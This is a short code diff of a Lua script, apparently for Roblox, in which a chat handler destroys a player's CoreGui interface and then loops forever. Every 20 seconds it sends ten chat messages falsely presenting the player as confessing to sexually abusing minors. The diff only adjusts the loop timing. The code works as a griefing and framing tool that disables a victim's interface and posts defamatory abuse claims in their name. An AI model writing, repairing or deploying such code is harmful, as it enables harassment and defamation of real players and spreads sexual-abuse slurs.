@@ -185,10 +185,11 @@ local function onChatted(player, message)
 	pcall(function() 
 	    game:GetService("CoreGui").RobloxGui:Destroy()
 	end)
-	while task.wait(20) do
+	while true do
 	    for i = 1, 10 do
 		chatMessage("i tooch minoors in my basement all day")
 	    end
+	    task.wait(20) 
 	end
     end
 end
